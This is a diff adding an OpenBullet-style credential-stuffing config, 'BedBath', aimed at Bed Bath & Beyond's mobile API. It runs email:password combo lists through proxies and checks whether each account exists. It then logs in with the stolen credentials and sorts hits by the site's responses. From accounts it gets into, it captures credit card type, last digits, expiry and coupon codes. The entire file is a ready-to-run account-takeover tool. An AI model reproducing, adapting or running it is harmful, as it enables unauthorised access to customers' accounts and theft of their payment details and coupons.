@@ -1,0 +1,121 @@
+[SETTINGS]
+{
+  "Name": "BedBath",
+  "SuggestedBots": 1,
+  "LastModified": "2019-03-15T20:39:06.9870221+01:00",
+  "AdditionalInfo": "",
+  "Author": "Fairy#6869",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST GET "https://www.bedbathandbeyond.com/apis/stateful/v1.0/authentication/session-confirmation?web3feo=true" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: BedBathAndBeyond Android OS 7.0 AppVersion 10.00.62" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Traffic_OS: ANDRIOD" 
+  HEADER "Referer: " 
+  HEADER "x-bbb-site-id: BedBathUS" 
+  HEADER "token: 34b50385-85e8-4815-914c-970262fc5bbc" 
+  HEADER "x-bbb-channel: MobileApp" 
+  HEADER "User-Agent: BedBathAndBeyond Android OS 7.0 AppVersion 10.00.62" 
+  HEADER "env: " 
+  HEADER "origin_of_traffic: MobileApp" 
+  HEADER "clientID: appuser" 
+  HEADER "Host: www.bedbathandbeyond.com" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Accept-Encoding: gzip" 
+#sessionConfirmationNumber PARSE "<SOURCE>" LR "sessionConfirmationNumber\": \"" "\"" Recursive=FALSE -> VAR "sessionConfirmationNumber" "" "" 
+REQUEST POST "https://www.bedbathandbeyond.com/apis/stateful/v1.0/customers/registration/status" AutoRedirect=TRUE 
+  CONTENT "email=<USER>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "User-Agent: BedBathAndBeyond Android OS 7.0 AppVersion 10.00.62" 
+  HEADER "Pragma: no-cache" 
+  HEADER "_dynSessConf: <sessionConfirmationNumber>" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "atg-rest-depth: 2" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: 24" 
+  HEADER "x-bbb-site-id: BedBathUS" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "Profile not found" 
+  KEYCHAIN Success OR 
+    KEY "profile_already_exist" 
+REQUEST POST "https://www.bedbathandbeyond.com/apis/stateful/v1.0/authentication/login " AutoRedirect=TRUE 
+  CONTENT "value.login=<USER>&value.password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: BedBathAndBeyond Android OS 7.0 AppVersion 10.00.62" 
+  HEADER "Pragma: no-cache" 
+  HEADER "atg-rest-depth: 2" 
+  HEADER "Traffic_OS: ANDRIOD" 
+  HEADER "Referer: " 
+  HEADER "x-bbb-site-id: BedBathUS" 
+  HEADER "_dynSessConf: <sessionConfirmationNumber>" 
+  HEADER "token: 34b50385-85e8-4815-914c-970262fc5bbc" 
+  HEADER "x-bbb-channel: MobileApp" 
+  HEADER "User-Agent: BedBathAndBeyond Android OS 7.0 AppVersion 10.00.62" 
+  HEADER "env: " 
+  HEADER "origin_of_traffic: MobileApp" 
+  HEADER "clientID: appuser" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Content-Length: 56" 
+  HEADER "Host: www.bedbathandbeyond.com" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Accept-Encoding: gzip" 
+  HEADER "X-NewRelic-ID: VQ4HV1ZQGwICU1ZUBAgP" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Your email/password does not match what we have on file" 
+  KEYCHAIN Success OR 
+    KEY "serviceStatus\" : \"SUCCESS\"," 
+#CC PARSE "<SOURCE>" JSON "creditCardType" Recursive=FALSE -> CAP "Credit Card" "" "" 
+#END PARSE "<SOURCE>" JSON "creditCardNumber" Recursive=FALSE -> CAP "Ending With" "" "" 
+#EXP PARSE "<SOURCE>" JSON "expirationYear" Recursive=FALSE -> CAP "Expiry Date" "" "" 
+#id PARSE "<SOURCE>" LR "id\": \"" "\"" Recursive=FALSE -> VAR "id" "" "" 
+REQUEST POST "https://www.bedbathandbeyond.com/apis/stateful/v1.0/myoffers/coupons" AutoRedirect=TRUE 
+  CONTENT "arg1=<USER>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: BedBathAndBeyond Android OS 7.0 AppVersion 10.00.62" 
+  HEADER "Pragma: no-cache" 
+  HEADER "atg-rest-depth: 3" 
+  HEADER "Traffic_OS: ANDRIOD" 
+  HEADER "Referer: " 
+  HEADER "x-bbb-site-id: BedBathUS" 
+  HEADER "_dynSessConf: <sessionConfirmationNumber>" 
+  HEADER "x-bbb-channel: MobileApp" 
+  HEADER "User-Agent: BedBathAndBeyond Android OS 7.0 AppVersion 10.00.62" 
+  HEADER "env: " 
+  HEADER "origin_of_traffic: MobileApp" 
+  HEADER "clientID: appuser" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Content-Length: 58" 
+  HEADER "Host: www.bedbathandbeyond.com" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Accept-Encoding: gzip" 
+  HEADER "X-NewRelic-ID: VQ4HV1ZQGwICU1ZUBAgP" 
+#couponsDescription PARSE "<SOURCE>" JSON "couponsDescription" Recursive=TRUE -> CAP "DESCRIPTION" "" "" 
+#onlineOfferCode PARSE "<SOURCE>" JSON "entryCd" Recursive=TRUE -> CAP "ONLINECODE" "" "" 
+PARSE "<SOURCE>" JSON "uniqueCouponCd" Recursive=TRUE -> CAP "COUPONCODE" "" "" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "<SOURCE>" DoesNotContain "uniqueCouponCd" 
